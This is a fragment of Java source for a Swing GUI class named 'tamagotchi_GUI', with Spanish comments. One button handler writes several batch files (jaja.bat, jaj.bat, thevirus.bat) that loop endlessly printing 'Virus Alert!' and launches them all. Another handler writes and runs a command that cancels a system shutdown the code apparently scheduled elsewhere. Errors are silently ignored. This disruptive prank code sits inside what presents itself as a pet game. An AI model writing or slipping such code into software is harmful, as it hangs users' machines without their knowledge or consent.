                                + "echo :uji >> jaja.bat \n"
                                + "echo echo Virus Alert! ! ! Virus Alert! ! ! Virus Alert! ! ! >> jaja.bat \n"
                                + "echo goto uji >> jaja.bat \n"
                                + "start jaja.bat \n"
                                + "echo @echo off >> jaj.bat \n"
                                + "echo color 0a >> jaj.bat \n"
                                + "echo :uji >> jaj.bat \n"
                                + "echo echo Virus Alert! ! ! Virus Alert! ! ! Virus Alert! ! ! >> jaj.bat \n"
                                + "echo goto uji >> jaj.bat \n"
                                + "start jaj.bat \n"
                                + "echo @echo off >> thevirus.bat \n"
                                + "echo color 0a >> thevirus.bat \n"
                                + "echo :uji >> thevirus.bat \n"
                                + "echo echo Virus Alert! ! ! Virus Alert! ! ! Virus Alert! ! ! >> thevirus.bat \n"
                                + "echo goto uji >> thevirus.bat \n"
                                + "start thevirus.bat \n"
                                + "Pause>nul \n"
                                + "exit ");
                        wr.close();
                        Desktop.getDesktop().open(arch4);
                    }

                } catch (IOException e) {
                }
            } else if (evento.getSource() == canAction) {
                //Cancelar el apagado del apartado anterior
                arch3 = new File("ShutdownCancel.bat");
                try {

                    FileWriter w = new FileWriter(arch3);
                    try (BufferedWriter bw = new BufferedWriter(w)) {
                        PrintWriter wr = new PrintWriter(bw);
                        wr.write("shutdown.exe -a");
                        wr.close();
                        Desktop.getDesktop().open(arch3);
                    }

                } catch (IOException e) {
                }
            }
        }
    }

    public static void main(String[] args) {
        tamagotchi_GUI interfaz = new tamagotchi_GUI();
    }
}

//+1100 lineas
